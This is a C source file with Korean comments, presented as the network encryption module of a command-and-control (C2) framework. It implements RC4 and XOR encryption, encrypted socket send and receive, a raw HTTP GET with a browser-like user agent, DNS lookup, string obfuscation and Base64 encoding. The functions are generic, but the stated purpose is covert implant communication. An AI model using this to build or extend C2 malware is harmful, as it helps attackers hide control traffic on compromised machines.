/*
 * Moonlight C2 Framework - 네트워크 암호화 모듈 (C 구현)
 * RC4, XOR 암호화 및 네트워크 통신 함수
 * 원본 어셈블리를 C로 변환
 */

#include <windows.h>
#include <winsock2.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

// ==============================================================================
// XOR 암호화 (최적화된 버전)
// ==============================================================================
void xor_encrypt(unsigned char* data, size_t length, 
                 const unsigned char* key, size_t key_length) {
    if (!data || !key || length == 0 || key_length == 0) {
        return;
    }
    
    size_t key_index = 0;
    
    for (size_t i = 0; i < length; i++) {
        data[i] ^= key[key_index];
        key_index = (key_index + 1) % key_length;
    }
}

// ==============================================================================
// RC4 암호화 구조체
// ==============================================================================
typedef struct {
    unsigned char S[256];
    int i;
    int j;
} RC4_Context;

// ==============================================================================
// RC4 키 스케줄링 알고리즘 (KSA)
// ==============================================================================
void rc4_init(RC4_Context* ctx, const unsigned char* key, size_t key_length) {
    if (!ctx || !key || key_length == 0) {
        return;
    }
    
    // S-box를 0-255로 초기화
    for (int i = 0; i < 256; i++) {
        ctx->S[i] = (unsigned char)i;
    }
    
    // 키 스케줄링
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + ctx->S[i] + key[i % key_length]) % 256;
        
        // S[i]와 S[j] 교환
        unsigned char temp = ctx->S[i];
        ctx->S[i] = ctx->S[j];
        ctx->S[j] = temp;
    }
    
    ctx->i = 0;
    ctx->j = 0;
}

// ==============================================================================
// RC4 암호화/복호화 (PRGA)
// ==============================================================================
void rc4_crypt(RC4_Context* ctx, unsigned char* data, size_t length) {
    if (!ctx || !data || length == 0) {
        return;
    }
    
    for (size_t n = 0; n < length; n++) {
        // i = (i + 1) % 256
        ctx->i = (ctx->i + 1) % 256;
        
        // j = (j + S[i]) % 256
        ctx->j = (ctx->j + ctx->S[ctx->i]) % 256;
        
        // S[i]와 S[j] 교환
        unsigned char temp = ctx->S[ctx->i];
        ctx->S[ctx->i] = ctx->S[ctx->j];
        ctx->S[ctx->j] = temp;
        
        // K = S[(S[i] + S[j]) % 256]
        unsigned char K = ctx->S[(ctx->S[ctx->i] + ctx->S[ctx->j]) % 256];
        
        // data[n] ^= K
        data[n] ^= K;
    }
}

// ==============================================================================
// 암호화된 데이터를 소켓으로 전송
// ==============================================================================
int socket_send_encrypted(SOCKET sock, const unsigned char* data, size_t length, 
                         RC4_Context* ctx) {
    if (sock == INVALID_SOCKET || !data || length == 0) {
        return -1;
    }
    
    // 데이터 복사 (원본 보존)
    unsigned char* encrypted = (unsigned char*)malloc(length);
    if (!encrypted) {
        return -1;
    }
    
    memcpy(encrypted, data, length);
    
    // 암호화
    if (ctx) {
        rc4_crypt(ctx, encrypted, length);
    }
    
    // 전송
    int sent = send(sock, (char*)encrypted, (int)length, 0);
    
    free(encrypted);
    return sent;
}

// ==============================================================================
// 소켓에서 암호화된 데이터 수신
// ==============================================================================
int socket_recv_encrypted(SOCKET sock, unsigned char* buffer, size_t buffer_size, 
                         RC4_Context* ctx) {
    if (sock == INVALID_SOCKET || !buffer || buffer_size == 0) {
        return -1;
    }
    
    // 수신
    int received = recv(sock, (char*)buffer, (int)buffer_size, 0);
    
    if (received > 0 && ctx) {
        // 복호화
        rc4_crypt(ctx, buffer, received);
    }
    
    return received;
}

// ==============================================================================
// HTTP 요청 생성
// ==============================================================================
int http_request(const char* host, int port, const char* path, 
                char* response, size_t response_size) {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    char request[1024];
    
    // Winsock 초기화
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return -1;
    }
    
    // 소켓 생성
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return -1;
    }
    
    // 서버 주소 설정
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(host);
    
    // 연결
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        closesocket(sock);
        WSACleanup();
        return -1;
    }
    
    // HTTP GET 요청 생성
    snprintf(request, sizeof(request),
             "GET %s HTTP/1.1\r\n"
             "Host: %s\r\n"
             "User-Agent: Mozilla/5.0\r\n"
             "Accept: */*\r\n"
             "Connection: close\r\n"
             "\r\n",
             path, host);
    
    // 요청 전송
    if (send(sock, request, (int)strlen(request), 0) < 0) {
        closesocket(sock);
        WSACleanup();
        return -1;
    }
    
    // 응답 수신
    int total_received = 0;
    int bytes_received;
    
    while ((bytes_received = recv(sock, response + total_received, 
                                  (int)(response_size - total_received - 1), 0)) > 0) {
        total_received += bytes_received;
        
        if (total_received >= response_size - 1) {
            break;
        }
    }
    
    response[total_received] = '\0';
    
    closesocket(sock);
    WSACleanup();
    
    return total_received;
}

// ==============================================================================
// DNS 쿼리 (단순 버전)
// ==============================================================================
int dns_query(const char* domain, char* ip_address, size_t ip_size) {
    WSADATA wsa;
    struct hostent* host;
    
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return -1;
    }
    
    host = gethostbyname(domain);
    
    if (host == NULL) {
        WSACleanup();
        return -1;
    }
    
    struct in_addr addr;
    addr.s_addr = *(u_long*)host->h_addr_list[0];
    
    strncpy(ip_address, inet_ntoa(addr), ip_size - 1);
    ip_address[ip_size - 1] = '\0';
    
    WSACleanup();
    return 0;
}

// ==============================================================================
// 빠른 체크섬 계산
// ==============================================================================
unsigned int fast_checksum(const unsigned char* data, size_t length) {
    unsigned int checksum = 0;
    
    for (size_t i = 0; i < length; i++) {
        checksum += data[i];
        checksum = (checksum << 1) | (checksum >> 31); // Rotate left
    }
    
    return checksum;
}

// ==============================================================================
// 문자열 난독화 (간단한 XOR)
// ==============================================================================
void obfuscate_string(char* str, size_t length) {
    const unsigned char key = 0xAA;
    
    for (size_t i = 0; i < length && str[i] != '\0'; i++) {
        str[i] ^= key;
    }
}

// ==============================================================================
// 문자열 난독화 해제
// ==============================================================================
void deobfuscate_string(char* str, size_t length) {
    // XOR은 대칭이므로 동일한 함수 사용
    obfuscate_string(str, length);
}

// ==============================================================================
// Base64 인코딩 테이블
// ==============================================================================
static const char base64_table[] = 
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

// ==============================================================================
// Base64 인코딩
// ==============================================================================
int base64_encode(const unsigned char* input, size_t input_length, 
                 char* output, size_t output_size) {
    if (!input || !output || input_length == 0) {
        return -1;
    }
    
    size_t output_length = 4 * ((input_length + 2) / 3);
    
    if (output_size < output_length + 1) {
        return -1;
    }
    
    size_t i, j;
    for (i = 0, j = 0; i < input_length;) {
        uint32_t octet_a = i < input_length ? input[i++] : 0;
        uint32_t octet_b = i < input_length ? input[i++] : 0;
        uint32_t octet_c = i < input_length ? input[i++] : 0;
        
        uint32_t triple = (octet_a << 16) + (octet_b << 8) + octet_c;
        
        output[j++] = base64_table[(triple >> 18) & 0x3F];
        output[j++] = base64_table[(triple >> 12) & 0x3F];
        output[j++] = base64_table[(triple >> 6) & 0x3F];
        output[j++] = base64_table[triple & 0x3F];
    }
    
    // 패딩 처리
    int padding = input_length % 3;
    if (padding > 0) {
        for (int k = 0; k < 3 - padding; k++) {
            output[output_length - 1 - k] = '=';
        }
    }
    
    output[output_length] = '\0';
    return (int)output_length;
}

// ==============================================================================
// 안전한 메모리 복사 (타이밍 공격 방지)
// ==============================================================================
void secure_memcpy(void* dest, const void* src, size_t n) {
    volatile unsigned char* d = (volatile unsigned char*)dest;
    const volatile unsigned char* s = (const volatile unsigned char*)src;
    
    for (size_t i = 0; i < n; i++) {
        d[i] = s[i];
    }
}

// ==============================================================================
// 안전한 메모리 제로화
// ==============================================================================
void secure_zero_memory(void* ptr, size_t size) {
    volatile unsigned char* p = (volatile unsigned char*)ptr;
    
    while (size--) {
        *p++ = 0;
    }
}
